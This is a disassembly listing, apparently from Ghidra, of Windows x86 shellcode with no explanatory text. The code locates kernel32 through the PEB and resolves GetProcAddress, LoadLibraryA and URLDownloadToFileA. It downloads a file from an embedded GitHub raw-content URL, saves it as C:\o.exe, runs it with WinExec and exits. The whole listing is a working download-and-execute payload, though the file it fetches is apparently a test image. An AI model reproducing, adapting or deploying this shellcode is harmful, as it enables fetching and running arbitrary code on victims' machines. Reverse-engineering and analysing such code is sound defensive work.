```
1          00000028 33 c9           XOR        ECX,ECX
2          0000002a 64 8b 41 30     MOV        EAX,dword ptr FS:[ECX + 0x30]
3          0000002e 8b 40 0c        MOV        EAX,dword ptr [EAX + 0xc]
4          00000031 8b 70 14        MOV        ESI,dword ptr [EAX + 0x14]
5          00000034 ad              LODSD      ESI
6          00000035 96              XCHG       EAX,ESI
7          00000036 ad              LODSD      ESI
8          00000037 8b 58 10        MOV        EBX,dword ptr [EAX + 0x10]
9          0000003a 8b 53 3c        MOV        EDX,dword ptr [EBX + 0x3c]
10         0000003d 03 d3           ADD        EDX,EBX
11         0000003f 8b 52 78        MOV        EDX,dword ptr [EDX + 0x78]
12         00000042 03 d3           ADD        EDX,EBX
13         00000044 8b 72 20        MOV        ESI,dword ptr [EDX + 0x20]
14         00000047 03 f3           ADD        ESI,EBX
15         00000049 33 c9           XOR        ECX,ECX
16                             LAB_0000004b                                    XREF[3]:     00000055(j), 0000005e(j), 
17                                                                                           00000067(j)  
18         0000004b 41              INC        ECX
19         0000004c ad              LODSD      ESI
20         0000004d 03 c3           ADD        EAX,EBX
21         0000004f 81 38 47        CMP        dword ptr [EAX],0x50746547
22                  65 74 50
23         00000055 75 f4           JNZ        LAB_0000004b
24         00000057 81 78 04        CMP        dword ptr [EAX + 0x4],0x41636f72
25                  72 6f 63 41
26         0000005e 75 eb           JNZ        LAB_0000004b
27         00000060 81 78 08        CMP        dword ptr [EAX + 0x8],0x65726464
28                  64 64 72 65
29         00000067 75 e2           JNZ        LAB_0000004b
30         00000069 8b 72 24        MOV        ESI,dword ptr [EDX + 0x24]
31         0000006c 03 f3           ADD        ESI,EBX
32         0000006e 66 8b 0c 4e     MOV        CX,word ptr [ESI + ECX*0x2]
33         00000072 49              DEC        ECX
34         00000073 8b 72 1c        MOV        ESI,dword ptr [EDX + 0x1c]
35         00000076 03 f3           ADD        ESI,EBX
36         00000078 8b 14 8e        MOV        EDX,dword ptr [ESI + ECX*0x4]
37         0000007b 03 d3           ADD        EDX,EBX
38         0000007d 33 c9           XOR        ECX,ECX
39         0000007f 51              PUSH       ECX
40         00000080 68 2e 65 78 65  PUSH       0x6578652e
41         00000085 68 43 3a 5c 6f  PUSH       0x6f5c3a43
42         0000008a 53              PUSH       EBX
43         0000008b 52              PUSH       EDX
44         0000008c 51              PUSH       ECX
45         0000008d 68 61 72 79 41  PUSH       0x41797261
46         00000092 68 4c 69 62 72  PUSH       0x7262694c
47         00000097 68 4c 6f 61 64  PUSH       0x64616f4c
48         0000009c 54              PUSH       ESP
49         0000009d 53              PUSH       EBX
50         0000009e ff d2           CALL       EDX
51         000000a0 83 c4 0c        ADD        ESP,0xc
52         000000a3 59              POP        ECX
53         000000a4 50              PUSH       EAX
54         000000a5 51              PUSH       ECX
55         000000a6 66 b9 6c 6c     MOV        CX,0x6c6c
56         000000aa 51              PUSH       ECX
57         000000ab 68 6f 6e 2e 64  PUSH       0x642e6e6f
58         000000b0 68 75 72 6c 6d  PUSH       0x6d6c7275
59         000000b5 54              PUSH       ESP
60         000000b6 ff d0           CALL       EAX
61         000000b8 83 c4 10        ADD        ESP,0x10
62         000000bb 8b 54 24 04     MOV        EDX,dword ptr [ESP + 0x4]
63         000000bf 33 c9           XOR        ECX,ECX
64         000000c1 51              PUSH       ECX
65         000000c2 66 b9 65 41     MOV        CX,0x4165
66         000000c6 51              PUSH       ECX
67         000000c7 33 c9           XOR        ECX,ECX
68         000000c9 68 6f 46 69 6c  PUSH       0x6c69466f
69         000000ce 68 6f 61 64 54  PUSH       0x5464616f
70         000000d3 68 6f 77 6e 6c  PUSH       0x6c6e776f
71         000000d8 68 55 52 4c 44  PUSH       0x444c5255
72         000000dd 54              PUSH       ESP
73         000000de 50              PUSH       EAX
74         000000df ff d2           CALL       EDX
75         000000e1 33 c9           XOR        ECX,ECX
76         000000e3 8d 54 24 24     LEA        EDX,[ESP + 0x24]
77         000000e7 51              PUSH       ECX
78         000000e8 51              PUSH       ECX
79         000000e9 52              PUSH       EDX
80         000000ea eb 47           JMP        LAB_00000133
81                              **************************************************************
82                              *                          FUNCTION                          *
83                              **************************************************************
84                              undefined __thiscall FUN_000000ec(void * this, undefined
85              undefined         AL:1           <RETURN>
86              void *            ECX:4 (auto)   this
87              undefined *       Stack[0x4]:4   param_1
88              undefined4 *      Stack[0x8]:4   param_2
89              undefined *       Stack[0xc]:4   param_3
90              uint              Stack[0x10]:4  param_4
91              undefined4        Stack[0x14]:4  param_5
92              undefined *       Stack[0x18]:4  param_6
93              undefined *       Stack[0x1c]:4  param_7
94              undefined *       Stack[0x20]:4  param_8
95              undefined4        Stack[0x24]:4  param_9
96              undefined *       Stack[0x28]:4  param_10
97              undefined4        Stack[0x2c]:4  param_11
98              undefined4        Stack[0x30]:4  param_12
99              undefined4        Stack[0x34]:4  param_13
100                             FUN_000000ec                                    XREF[1]:     00000133(c)  
101        000000ec 51              PUSH       this
102        000000ed ff d0           CALL       EAX
103        000000ef 83 c4 1c        ADD        ESP,0x1c
104        000000f2 33 c9           XOR        this,this
105        000000f4 5a              POP        EDX
106        000000f5 5b              POP        EBX
107        000000f6 53              PUSH       EBX
108        000000f7 52              PUSH       EDX
109        000000f8 51              PUSH       this
110        000000f9 68 78 65 63 61  PUSH       0x61636578
111        000000fe 88 4c 24 03     MOV        byte ptr [ESP + 0x3],this
112        00000102 68 57 69 6e 45  PUSH       0x456e6957
113        00000107 54              PUSH       ESP
114        00000108 53              PUSH       EBX
115        00000109 ff d2           CALL       EDX
116        0000010b 6a 05           PUSH       0x5
117        0000010d 8d 4c 24 18     LEA        this,[ESP + 0x18]
118        00000111 51              PUSH       this
119        00000112 ff d0           CALL       EAX
120        00000114 83 c4 0c        ADD        ESP,0xc
121        00000117 5a              POP        EDX
122        00000118 5b              POP        EBX
123        00000119 68 65 73 73 61  PUSH       0x61737365
124        0000011e 83 6c 24 03 61  SUB        dword ptr [ESP + 0x3],0x61
125        00000123 68 50 72 6f 63  PUSH       0x636f7250
126        00000128 68 45 78 69 74  PUSH       0x74697845
127        0000012d 54              PUSH       ESP
128        0000012e 53              PUSH       EBX
129        0000012f ff d2           CALL       EDX
130        00000131 ff d0           CALL       EAX
131                             LAB_00000133                                    XREF[1]:     000000ea(j)  
132        00000133 e8 b4 ff ff ff  CALL       FUN_000000ec                                     undefined FUN_000000ec(void * th
133        00000138 68              ??         68h    h
134        00000139 74              ??         74h    t
135        0000013a 74              ??         74h    t
136        0000013b 70              ??         70h    p
137        0000013c 73              ??         73h    s
138        0000013d 3a              ??         3Ah    :
139        0000013e 2f              ??         2Fh    /
140        0000013f 2f              ??         2Fh    /
141        00000140 72              ??         72h    r
142        00000141 61              ??         61h    a
143        00000142 77              ??         77h    w
144        00000143 2e              ??         2Eh    .
145        00000144 67              ??         67h    g
146        00000145 69              ??         69h    i
147        00000146 74              ??         74h    t
148        00000147 68              ??         68h    h
149        00000148 75              ??         75h    u
150        00000149 62              ??         62h    b
151        0000014a 75              ??         75h    u
152        0000014b 73              ??         73h    s
153        0000014c 65              ??         65h    e
154        0000014d 72              ??         72h    r
155        0000014e 63              ??         63h    c
156        0000014f 6f              ??         6Fh    o
157        00000150 6e              ??         6Eh    n
158        00000151 74              ??         74h    t
159        00000152 65              ??         65h    e
160        00000153 6e              ??         6Eh    n
161        00000154 74              ??         74h    t
162        00000155 2e              ??         2Eh    .
163        00000156 63              ??         63h    c
164        00000157 6f              ??         6Fh    o
165        00000158 6d              ??         6Dh    m
166        00000159 2f              ??         2Fh    /
167        0000015a 61              ??         61h    a
168        0000015b 63              ??         63h    c
169        0000015c 63              ??         63h    c
170        0000015d 69              ??         69h    i
171        0000015e 64              ??         64h    d
172        0000015f 65              ??         65h    e
173        00000160 6e              ??         6Eh    n
174        00000161 74              ??         74h    t
175        00000162 61              ??         61h    a
176        00000163 6c              ??         6Ch    l
177        00000164 72              ??         72h    r
178        00000165 65              ??         65h    e
179        00000166 62              ??         62h    b
180        00000167 65              ??         65h    e
181        00000168 6c              ??         6Ch    l
182        00000169 2f              ??         2Fh    /
183        0000016a 61              ??         61h    a
184        0000016b 63              ??         63h    c
185        0000016c 63              ??         63h    c
186        0000016d 69              ??         69h    i
187        0000016e 64              ??         64h    d
188        0000016f 65              ??         65h    e
189        00000170 6e              ??         6Eh    n
190        00000171 74              ??         74h    t
191        00000172 61              ??         61h    a
192        00000173 6c              ??         6Ch    l
193        00000174 72              ??         72h    r
194        00000175 65              ??         65h    e
195        00000176 62              ??         62h    b
196        00000177 65              ??         65h    e
197        00000178 6c              ??         6Ch    l
198        00000179 2e              ??         2Eh    .
199        0000017a 63              ??         63h    c
200        0000017b 6f              ??         6Fh    o
201        0000017c 6d              ??         6Dh    m
202        0000017d 2f              ??         2Fh    /
203        0000017e 67              ??         67h    g
204        0000017f 68              ??         68h    h
205        00000180 2d              ??         2Dh    -
206        00000181 70              ??         70h    p
207        00000182 61              ??         61h    a
208        00000183 67              ??         67h    g
209        00000184 65              ??         65h    e
210        00000185 73              ??         73h    s
211        00000186 2f              ??         2Fh    /
212        00000187 74              ??         74h    t
213        00000188 68              ??         68h    h
214        00000189 65              ??         65h    e
215        0000018a 6d              ??         6Dh    m
216        0000018b 65              ??         65h    e
217        0000018c 2f              ??         2Fh    /
218        0000018d 69              ??         69h    i
219        0000018e 6d              ??         6Dh    m
220        0000018f 61              ??         61h    a
221        00000190 67              ??         67h    g
222        00000191 65              ??         65h    e
223        00000192 73              ??         73h    s
224        00000193 2f              ??         2Fh    /
225        00000194 74              ??         74h    t
226        00000195 65              ??         65h    e
227        00000196 73              ??         73h    s
228        00000197 74              ??         74h    t
229        00000198 2e              ??         2Eh    .
230        00000199 70              ??         70h    p
231        0000019a 6e              ??         6Eh    n
232        0000019b 67              ??         67h    g

```
